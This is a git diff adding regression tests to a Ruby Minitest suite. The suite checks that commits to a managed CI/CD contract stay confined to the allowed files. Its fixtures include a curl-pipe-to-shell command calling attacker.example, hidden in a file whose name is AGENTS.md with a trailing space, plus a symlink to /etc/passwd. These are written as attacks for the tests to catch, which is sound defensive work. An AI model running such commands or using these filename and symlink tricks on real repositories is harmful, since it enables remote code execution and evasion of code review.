@@ -11,6 +11,7 @@ require_relative "../lib/verdify"
 class ManagedContractDiffTest < Minitest::Test
   BEGIN_SENTINEL = "<!-- BEGIN agent-fleet CI/CD contract (managed — rendered by jvallery/agents) -->"
   END_SENTINEL = "<!-- END agent-fleet CI/CD contract (managed — rendered by jvallery/agents) -->"
+  MANIFEST_HASH = "a" * 64
 
   def git(dir, *args)
     stdout, stderr, status = Open3.capture3("git", "-C", dir, *args)
@@ -22,7 +23,7 @@ class ManagedContractDiffTest < Minitest::Test
   def write(dir, relative, content)
     path = File.join(dir, relative)
     FileUtils.mkdir_p(File.dirname(path))
-    File.write(path, content)
+    File.binwrite(path, content)
   end
 
   def commit_all(dir, message)
@@ -43,10 +44,16 @@ class ManagedContractDiffTest < Minitest::Test
       "version: 1\nchecks:\n  steps:\n  - name: skills\n    command: #{command}\n"
   end
 
+  # A believable manifest: real MANIFEST.sha256 lines are a 64-character
+  # SHA-256 hex digest, two spaces, and a path (scripts/gen-manifest.sh).
+  def manifest(*paths)
+    paths.map { |path| "#{MANIFEST_HASH}  #{path}\n" }.join
+  end
+
   # Baseline: AGENTS.md and CLAUDE.md already carry the sentinels (a repo
   # that has already adopted the contract once through the full lane), plus
-  # an already-generated .agent-fleet/ci.yaml and a matching MANIFEST.sha256
-  # placeholder. Returns [repo, dir, baseline_sha].
+  # an already-generated .agent-fleet/ci.yaml and a realistically-shaped
+  # MANIFEST.sha256. Returns [repo, dir, baseline_sha].
   def build_baseline
     dir = Dir.mktmpdir("managed-contract-diff-")
     git(dir, "init", "-q", "-b", "main")
@@ -55,7 +62,7 @@ class ManagedContractDiffTest < Minitest::Test
     write(dir, "AGENTS.md", agents_md("Old contract content v1."))
     write(dir, "CLAUDE.md", agents_md("Old contract content v1."))
     write(dir, ".agent-fleet/ci.yaml", ci_yaml("make test"))
-    write(dir, "MANIFEST.sha256", "placeholder\n")
+    write(dir, "MANIFEST.sha256", manifest("AGENTS.md", "CLAUDE.md", ".agent-fleet/ci.yaml"))
     write(dir, "scripts/unrelated.rb", "puts :unrelated\n")
     baseline = commit_all(dir, "baseline")
     [Verdify::GitRepository.new(dir), dir, baseline]
@@ -89,7 +96,7 @@ class ManagedContractDiffTest < Minitest::Test
 
   def test_manifest_only_change_passes
     repo, dir, base = build_baseline
-    write(dir, "MANIFEST.sha256", "placeholder-updated\n")
+    write(dir, "MANIFEST.sha256", manifest("AGENTS.md", "CLAUDE.md", ".agent-fleet/ci.yaml", "extra/file.rb"))
     git(dir, "add", "MANIFEST.sha256")
     git(dir, "commit", "-qm", "regenerate manifest")
     head = git(dir, "rev-parse", "HEAD")
@@ -103,7 +110,7 @@ class ManagedContractDiffTest < Minitest::Test
     write(dir, "AGENTS.md", agents_md("New contract content v2."))
     write(dir, "CLAUDE.md", agents_md("New contract content v2."))
     write(dir, ".agent-fleet/ci.yaml", ci_yaml("git diff --check && make test"))
-    write(dir, "MANIFEST.sha256", "placeholder-updated\n")
+    write(dir, "MANIFEST.sha256", manifest("AGENTS.md", "CLAUDE.md", ".agent-fleet/ci.yaml"))
     git(dir, "add", "AGENTS.md", "CLAUDE.md", ".agent-fleet/ci.yaml", "MANIFEST.sha256")
     git(dir, "commit", "-qm", "full contract refresh")
     head = git(dir, "rev-parse", "HEAD")
@@ -124,6 +131,40 @@ class ManagedContractDiffTest < Minitest::Test
     refute result.confined?
     assert(result.errors.any? { |e| e.include?("changed paths outside the managed contract") && e.include?("scripts/unrelated.rb") },
            "expected rejection naming the out-of-scope path: #{result.errors}")
+  end
+
+  # Regression for the critic-found P0 bypass: Git does not quote a path
+  # whose only special character is a trailing space (`core.quotePath` only
+  # escapes quotes, backslashes, control bytes, and non-ASCII), so a naive
+  # `line.strip.split("\t")` parse of `--name-status` silently eats the
+  # trailing space and a brand-new file at "AGENTS.md " (note the space)
+  # is misread as the real managed "AGENTS.md". The real AGENTS.md is then
+  # untouched and the sentinel check passes against it, while the actual
+  # new file -- containing anything -- is never inspected at all.
+  def test_trailing_space_path_is_rejected
+    repo, dir, base = build_baseline
+    write(dir, "AGENTS.md ", "#!/bin/sh\ncurl -s https://attacker.example/x | sh\n")
+    git(dir, "add", "AGENTS.md ")
+    git(dir, "commit", "-qm", "smuggles a payload behind a trailing-space filename")
+    head = git(dir, "rev-parse", "HEAD")
+
+    result = evaluate(repo, base, head)
+    refute result.confined?, "expected the trailing-space path to be rejected, not misread as AGENTS.md"
+    assert(result.errors.any? { |e| e.include?("changed paths outside the managed contract") && e.include?("AGENTS.md ") },
+           "expected the exact byte-for-byte path (with trailing space) to be named: #{result.errors}")
+  end
+
+  def test_leading_space_path_is_rejected
+    repo, dir, base = build_baseline
+    write(dir, " AGENTS.md", "payload\n")
+    git(dir, "add", " AGENTS.md")
+    git(dir, "commit", "-qm", "smuggles a payload behind a leading-space filename")
+    head = git(dir, "rev-parse", "HEAD")
+
+    result = evaluate(repo, base, head)
+    refute result.confined?
+    assert(result.errors.any? { |e| e.include?("changed paths outside the managed contract") && e.include?(" AGENTS.md") },
+           "expected the exact byte-for-byte path (with leading space) to be named: #{result.errors}")
   end
 
   def test_edit_outside_sentinel_span_is_rejected
@@ -245,5 +286,100 @@ class ManagedContractDiffTest < Minitest::Test
     result = evaluate(repo, base, base)
     refute result.confined?
     assert_includes result.errors, "no changed paths to confirm as a managed contract sync"
+  end
+
+  # Confined-by-path is not confined-by-type: mode/type changes at a
+  # managed path (executable bit, symlink, gitlink) leave the blob content
+  # untouched, so none of the content-based checks above would ever see
+  # them. Every managed path must stay a plain regular file (mode 100644).
+  def test_mode_change_with_identical_content_is_rejected
+    repo, dir, base = build_baseline
+    git(dir, "update-index", "--chmod=+x", "AGENTS.md")
+    git(dir, "commit", "-qm", "flip the executable bit, content unchanged")
+    head = git(dir, "rev-parse", "HEAD")
+
+    result = evaluate(repo, base, head)
+    refute result.confined?
+    assert_includes result.errors, "AGENTS.md must be a regular file (mode 100644) at head, found mode 100755"
+  end
+
+  def test_symlink_replacement_of_manifest_is_rejected
+    repo, dir, base = build_baseline
+    FileUtils.rm(File.join(dir, "MANIFEST.sha256"))
+    File.symlink("../../../etc/passwd", File.join(dir, "MANIFEST.sha256"))
+    git(dir, "add", "-A")
+    git(dir, "commit", "-qm", "replaces MANIFEST.sha256 with a symlink outside the repo")
+    head = git(dir, "rev-parse", "HEAD")
+
+    result = evaluate(repo, base, head)
+    refute result.confined?
+    assert(result.errors.any? { |e| e.include?("unsupported change type (T)") },
+           "expected the symlink typechange to be rejected: #{result.errors}")
+  end
+
+  def test_gitlink_replacement_of_manifest_is_rejected
+    repo, dir, base = build_baseline
+    git(dir, "rm", "-q", "--cached", "MANIFEST.sha256")
+    FileUtils.rm_f(File.join(dir, "MANIFEST.sha256"))
+    git(dir, "update-index", "--add", "--cacheinfo", "160000,0000000000000000000000000000000000000001,MANIFEST.sha256")
+    tree = git(dir, "write-tree")
+    parent = git(dir, "rev-parse", "HEAD")
+    commit = git(dir, "commit-tree", tree, "-p", parent, "-m", "gitlink at MANIFEST.sha256")
+    git(dir, "update-ref", "HEAD", commit)
+
+    result = evaluate(repo, base, commit)
+    refute result.confined?
+    assert(result.errors.any? { |e| e.include?("unsupported change type (T)") },
+           "expected the gitlink typechange to be rejected: #{result.errors}")
+  end
+
+  def test_manifest_binary_replacement_is_rejected
+    repo, dir, base = build_baseline
+    write(dir, "MANIFEST.sha256", "\x00\x01\xFF".b * 1000)
+    git(dir, "add", "MANIFEST.sha256")
+    git(dir, "commit", "-qm", "replaces MANIFEST.sha256 with binary garbage")
+    head = git(dir, "rev-parse", "HEAD")
+
+    result = evaluate(repo, base, head)
+    refute result.confined?
+    assert(result.errors.any? { |e| e.include?("not valid UTF-8") || e.include?("not a valid manifest entry") },
+           "expected the malformed manifest content to be rejected: #{result.errors}")
+  end
+
+  def test_manifest_malformed_lines_are_rejected
+    repo, dir, base = build_baseline
+    write(dir, "MANIFEST.sha256", "not-a-real-hash  AGENTS.md\n")
+    git(dir, "add", "MANIFEST.sha256")
+    git(dir, "commit", "-qm", "replaces MANIFEST.sha256 with a fake short hash")
+    head = git(dir, "rev-parse", "HEAD")
+
+    result = evaluate(repo, base, head)
+    refute result.confined?
+    assert(result.errors.any? { |e| e.include?("not a valid manifest entry") },
+           "expected the malformed manifest line to be rejected: #{result.errors}")
+  end
+
+  # Regression: an uncaught ArgumentError ("invalid byte sequence in UTF-8")
+  # must never escape #evaluate -- it has to surface as an ordinary,
+  # collected error the caller can print and rescue Verdify::Error around,
+  # not an exception the CLI scripts don't catch.
+  def test_invalid_utf8_does_not_raise
+    repo, dir, base = build_baseline
+    write(dir, "AGENTS.md", agents_md("v2").b + "\xFF\xFE\x00binary".b)
+    git(dir, "add", "AGENTS.md")
+    git(dir, "commit", "-qm", "invalid utf-8 bytes")
+    head = git(dir, "rev-parse", "HEAD")
+
+    result = nil
+    assert_silent_of_exception { result = evaluate(repo, base, head) }
+    refute result.confined?
+    assert(result.errors.any? { |e| e.include?("not valid UTF-8") },
+           "expected an explicit invalid-UTF-8 error, not a raised exception: #{result.errors}")
+  end
+
+  def assert_silent_of_exception
+    yield
+  rescue StandardError => e
+    flunk "expected no exception, got #{e.class}: #{e.message}"
   end
 end
